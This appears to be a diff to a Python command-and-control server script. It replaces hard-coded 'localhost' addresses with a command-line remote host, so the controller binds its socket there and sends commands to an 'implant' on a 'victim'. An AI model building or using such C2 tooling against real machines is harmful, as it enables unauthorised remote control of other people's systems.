@@ -3,6 +3,12 @@ from colorama import Fore, Back, Style
 import socket
 import sys
 import rsa
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('rhost')
+
+args = parser.parse_args()
 
 
 #generate the rsa key used by C2
@@ -12,7 +18,7 @@ import rsa
 c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to the port
-server_address = ('localhost', 9999)
+server_address = (args.rhost, 9999)
 c2_socket.bind(server_address)
 
 colorama.init(autoreset=True)
@@ -52,7 +58,7 @@ def send_implant(comm):
     #Send comm command to victim
     implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Connect the socket to the port where the server is listening
-    implant_server_address = ('localhost', 10000)
+    implant_server_address = (args.rhost, 10000)
     implant_socket.connect(implant_server_address)
     implant_socket.sendall(str.encode(comm))
     implant_socket.close()
